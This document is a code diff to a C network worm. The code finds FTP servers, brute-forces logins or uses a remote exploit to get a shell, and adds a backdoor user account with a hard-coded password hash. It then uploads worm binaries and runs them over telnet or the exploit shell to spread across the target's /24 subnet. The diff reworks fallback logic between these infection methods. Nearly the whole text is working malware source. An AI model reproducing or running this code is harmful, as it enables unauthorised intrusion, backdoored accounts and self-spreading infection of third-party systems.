@@ -60,7 +60,7 @@ int main(int argc, char *const *argv) {
   char telnet_buffer[256];
   char range[32];
   char *interface = NULL;
-  int shell_fd, telnet_fd, method, opt, err;
+  int shell_fd, method, opt, err;
   int use_raw_socket = 0, verbose = 0;
   unsigned int i, length;
 
@@ -137,22 +137,9 @@ int main(int argc, char *const *argv) {
       if(strstr(target->banner, "FTP") != NULL) {
         fprintf(stdout, "Attacking target \"%s:%u\"...\n", target->address, target->port);
 
-        snprintf(range, sizeof range, "%s", target->address);
-        for(i = strlen(range); i > 0 && range[i] != '.'; --i) {
-          range[i] = '\0';
-        }
 
-        strncpy(range + i + 1, "1-255\0", sizeof range - i - 1);
-
-        length = snprintf(cmd_buffer, sizeof cmd_buffer,
-                  "chmod +x ~%s/worm* ; "
-                  "~%s/worm %s 1-1024 ; "
-                  "~%s/worm.i686 %s 1-1024\n", 
-                  FTP_USER, FTP_USER, range, FTP_USER, range);
-
-        fprintf(stdout, "Command to be executed (%u):\n%s", length, cmd_buffer);
-
-        if((method = rand() % 1) == 0) {
+        if((method = rand() % 2) == 0) {
+_bruteforce:
           fprintf(stdout, "Performing brute-force attack...\n");
 
           for(i = 0; i < MAX_THREADS; ++i) {
@@ -167,29 +154,84 @@ int main(int argc, char *const *argv) {
           for(i = 0; i < MAX_THREADS; ++i) {
             pthread_join(threads[i], NULL);
           }
+        }
 
-          if(ftp_fd != 0) {
-            spread(ftp_fd, "worm", "worm");
-            spread(ftp_fd, "worm.i686", "worm.i686");
-            spread(ftp_fd, "worm.expect", "worm.expect");
-            spread(ftp_fd, "worm.expect.i686", "worm.expect.i686");
-            spread(ftp_fd, "worm.telnet", "worm.telnet");
-            close(ftp_fd);
-          }
+        if(ftp_fd == 0) {
+          fprintf(stdout, "Using exploit to add FTP user...\n");
+          length = snprintf(cmd_buffer, sizeof cmd_buffer,
+                    "useradd -p \\$1\\$Q.BMJBRg\\$DDb.ITROcDJ.ctYyqdVfA0 wormer\n");
 
-          length = snprintf(telnet_buffer, sizeof telnet_buffer,
-                    "./worm.expect worm.telnet %s 23 %s %s %s 1-1024 ; "
-                    "./worm.expect.i686 worm.telnet %s 23 %s %s %s 1-1024\n",
-                    target->address, FTP_USER, ftp_password, range,
-                    target->address, FTP_USER, ftp_password, range);
+          fprintf(stdout, "Command to be executed (%u):\n%s", length, cmd_buffer);
 
-          system(telnet_buffer);
-        } else {
           shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@");
           write(shell_fd, cmd_buffer, length);
           close(shell_fd);
+
+          if((ftp_fd = ftp_try_login(target->address, target->port, "wormer", "ABC", 0)) <= 0) {
+            fprintf(stdout, "Failed to get FTP access using exploit!\n");
+            if(method == 1) {
+              method = 0;
+              goto _bruteforce;
+            }
+
+            fprintf(stderr, "Failed to spread files with brute-force and exploit methods!\n");
+            return -1;
+          }
+
+          fprintf(stdout, "FTP access granted using exploit!\n");
         }
 
+        spread(ftp_fd, "worm", "worm");
+        spread(ftp_fd, "worm.i686", "worm.i686");
+        spread(ftp_fd, "worm.expect", "worm.expect");
+        spread(ftp_fd, "worm.telnet", "worm.telnet");
+        close(ftp_fd);
+
+        snprintf(range, sizeof range, "%s", target->address);
+
+        for(i = strlen(range); i > 0 && range[i] != '.'; --i) {
+          range[i] = '\0';
+        }
+
+        strncpy(range + i + 1, "1-255\0", sizeof range - i - 1);
+
+        if(method == 0) {
+_telnet:
+          fprintf(stdout, "Executing worm remotely using telnet...\n");
+          length = snprintf(telnet_buffer, sizeof telnet_buffer,
+                    "./worm.expect worm.telnet %s 23 %s %s %s 1-1024",
+                    target->address, FTP_USER, ftp_password, range);
+
+          if(system(telnet_buffer) != 0) {
+            fprintf(stdout, "Failed to execute worm remotely using telnet!\n");
+          }
+
+          goto _success;
+        }
+
+        fprintf(stdout, "Executing worm remotely using exploit...\n");
+
+        length = snprintf(cmd_buffer, sizeof cmd_buffer,
+                  "chmod +x ~%s/worm* ; "
+                  "~%s/worm %s 1-1024 ; "
+                  "~%s/worm.i686 %s 1-1024\n", 
+                  FTP_USER, FTP_USER, range, FTP_USER, range);
+
+        fprintf(stdout, "Command to be executed (%u):\n%s", length, cmd_buffer);
+
+        if((shell_fd = remote_exploit(target->address, target->port, "ftp", "mozilla@")) > 0) {
+          write(shell_fd, cmd_buffer, length);
+          close(shell_fd);
+        } else {
+          fprintf(stdout, "Failed to execute worm remotely using exploit!\n");
+
+          if(method == 1) {
+            method = 0;
+            goto _telnet;
+          }
+        }
+
+_success:
         fprintf(stdout, "Attack completed!\n");
       }
     }
